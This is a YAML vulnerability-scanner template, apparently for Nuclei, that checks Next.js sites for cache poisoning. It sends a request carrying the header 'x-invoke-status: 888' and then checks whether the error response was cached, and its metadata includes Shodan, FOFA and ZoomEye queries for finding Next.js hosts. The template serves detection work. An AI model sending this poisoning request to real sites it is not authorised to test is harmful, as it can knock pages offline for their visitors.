http:
- matchers:
  - condition: and
    dsl:
    - status_code_1 == 888 && contains(body_1, '/_error') && !contains(cache_control_1,
      'no-cache') && !contains(pragma_1, 'no-cache')
    - status_code_2 == 888 && contains(body_2, '/_error') && !contains(cache_control_2,
      'no-cache') && !contains(pragma_2, 'no-cache')
    type: dsl
  raw:
  - 'GET /?cb={{rand}} HTTP/1.1

    Host: {{Hostname}}

    Priority: u=1

    x-invoke-status: 888

    '
  - 'GET /?cb={{rand}} HTTP/1.1

    Host: {{Hostname}}

    '
id: next-js-cache-poisoning
info:
  author: Ice3man543
  description: 'Next.js is vulnerable to cache poisoning through the x-middleware-prefetch
    and x-invoke-status headers. This can result in DoS by serving an empty JSON object
    or error page instead of the intended content, affecting SSR responses.

    '
  metadata:
    fofa-query: body="/_next/static"
    framework: node.js
    product: next.js
    shodan-query:
    - http.html:"/_next/static"
    - cpe:"cpe:2.3:a:zeit:next.js"
    vendor: vercel
    zoomeye-query: app="Next.js"
  name: Next.js Cache Poisoning
  reference:
  - https://github.com/vercel/next.js/compare/v13.4.20-canary.12...v13.4.20-canary.13
  - https://github.com/valentin-panov/nextjs-no-cache-issue
  - https://zhero-web-sec.github.io/research-and-things/nextjs-and-cache-poisoning-a-quest-for-the-black-hole
  severity: high
  tags: cve,cve2023,next-js,cache,vuln
variables:
  rand: '{{rand_text_numeric(5)}}'
